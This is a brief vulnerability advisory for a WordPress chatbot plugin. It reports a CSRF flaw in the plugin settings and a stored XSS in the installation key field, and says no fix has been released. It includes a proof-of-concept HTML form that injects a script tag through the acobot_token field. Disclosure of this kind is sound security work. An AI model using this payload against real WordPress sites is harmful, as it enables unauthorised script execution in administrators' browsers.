==========================================================

## Plugin description: 
==========================================================
Enhance your WordPress with a virtual robot in 3 minutes or less and boost your sales like never before. It's simple, easy and fast.

## CSRF:
==========================================================
It is possible to change plugin settings by tricking a logged in admin to visit a crafted page. 


## Stored XSS:
==========================================================
The installation key in the admin panel is stored and displayed unsanitized. This allows an attacker to perform XSS through that field. 

PoC:
Log in as admin and submit the this form:
<form method="POST" action="http://[URL]/wp-admin/options-general.php?page=acobot&update_account=something"> 
 	<input type="text" name="acobot_token" value="&quot;/><script>alert(1)</script>"><br />
	<input type="hidden" name="acobot_code_script" value=""><br />
	<input type="submit">
</form>


## Solution
==========================================================
No fix has been released.
